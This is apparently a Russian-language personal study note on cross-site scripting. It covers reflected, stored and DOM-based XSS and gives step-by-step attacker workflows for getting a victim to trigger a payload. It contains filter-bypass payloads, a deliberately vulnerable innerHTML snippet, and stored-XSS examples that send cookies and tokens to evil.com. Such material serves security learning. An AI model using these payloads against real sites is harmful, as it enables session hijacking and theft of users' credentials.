[XSS (Cross-Site Scripting)] — это атака, при которой злоумышленник внедряет вредоносный JavaScript-код на сайт, который затем выполняется в браузере другого пользователя. Этот код может украсть куки, токены или данные, подделать содержимое страницы или выполнить действия от имени жертвы. Атака возможна, когда сайт выводит пользовательский ввод без должной очистки (экранирования).

----

`<script>print()</script>`  (в хроме)
или
`<script>alert(1)</script>` 

если вызывается - уязвимость подтверждена

----
типы атак:

- Reflected XSS
- [Отраженный XSS]        при котором вредоносный скрипт исходит из текущего HTTP-запроса
- 
- Stored XSS]
- [Хранимый XSS]           при котором вредоносный скрипт исходит из базы данных сайта
- 
- DOM-based XSS
- [XSS на основе DOM]  при котором уязвимость возникает в клиентском коде, а не в серверном

## Reflected XSS

Уязвимость возникает, когда веб-приложение принимает данные в HTTP-запросе (обычно через параметры URL) и сразу же выводит их в ответе без должной проверки или экранирования

Атакующий создаёт специальную ссылку с вредоносным кодом и отправляет её жертве (фишинг, соцсети). Жертва переходит по ссылке, сервер отражает код обратно в ответе, и браузер жертвы выполняет его

1) найти на стр инпут (например форма поиска) который после отправки возвращается в этом же виде в коде страницы
2) делаю пейлоад для этого инпута и создаю ссылку под этот запрос (с пейлоадом)
3) потом эту ссылку нужно отправить жертве, чтобы та перешна по ней

пример:

нужно посмотреть код страницы, где конкретно в html отображается отраженный пейлоад и понять как сделать так, чтобы пейлоад выполнился
также некоторые символы, теги, функции итп могут блокироваться (нужно будет обходить)
```html
<!-- Базовый тест -->
https://example.com/page?name=<script>alert(1)</script>

<!-- поле нейм подставлялось в значение прямо в html без валидации -->

<!-- Если фильтруют тег script -->
https://example.com/page?name=<img src=x onerror=alert(1)>

<!-- Выход из атрибута тега -->
https://example.com/page?user="><script>alert(1)</script>
```


## Stored XSS

скрипт навсегда сохраняется на сервере (в базе данных, файле, на форуме) и выполняется каждый раз, когда любой пользователь открывает заражённую страницу

например оставил скрипт в комментариях, или в сообщении в чате, в отзывах. где либо еще, где можно сохранить свой текст, файл и он будет доступен другим юзерам.
и когда кто-либо перейдет на страницу с этим пейлоадом (который сохранен на сервере как коммент например) тогда этот пйлоад может выполниться в браузере жертвы.

1) поиск на сайте мест - где можно оставлять те или иные данные, которые сохраняются сервером и к которым есть доступ у других пользователей или админов
2) проверяю, как и куда сохранятся пейлоад, как выглядит код
3) создаю пейлоад и отправляю / сохраняю на сервер (например коммент оставил)
4) дальше любой чувак , который открыл эту страницу инициирует запуск скрипта атоматически

пример:
```html
<!-- Сообщение на форуме -->
<script>alert(document.cookie)</script>

<!-- Поле "Имя пользователя" в профиле -->
<img src=x onerror="new Image().src='https://evil.com/log?'+localStorage.token">

<!-- Комментарий к посту -->
<svg onload="fetch('https://evil.com/steal', {method:'POST', body:document.cookie})">
```


## DOM-Based XSS

Уникальный тип XSS, где вся проблема живёт не на сервере, а в клиентском JavaScript-коде. 
Вредоносный скрипт не отражается сервером и не хранится в базе. Он встраивается в страницу прямо в браузере жертвы через манипуляции с DOM

Современные веб-страницы часто используют JavaScript для чтения данных из URL 

(например, `window.location.hash` или `document.location.search`) 

и последующей вставки этих данных на страницу 
(например, через `element.innerHTML`). 
Если злоумышленник может контролировать эти данные, он заставит скрипт страницы вставить вредоносный код

1) изучаем js код, места где код берет данные из адресной строки (например, `location.hash`) и вставляет их в DOM через innerHTML
2) делаю ссылку с пейлоадом
3) отправить ссылку жертве
4) / js - выполняет отравленный код и вставляет его в DOM  и браузер жертвы выполнит вредоносную задачу..

например:
```html
<!-- URL с хешем -->
https://example.com/welcome#<img src=1 onerror=alert(1)>

<!-- URL с параметром, читаемым через JS -->
https://example.com/?returnUrl=javascript:alert(document.domain)

<!-- Пример уязвимого JS-кода на странице -->
<script>
  var hash = location.hash.substring(1); // Берёт данные из URL
  document.body.innerHTML = "Вы искали: " + hash; // Вставляет без фильтра -> XSS
</script>
```
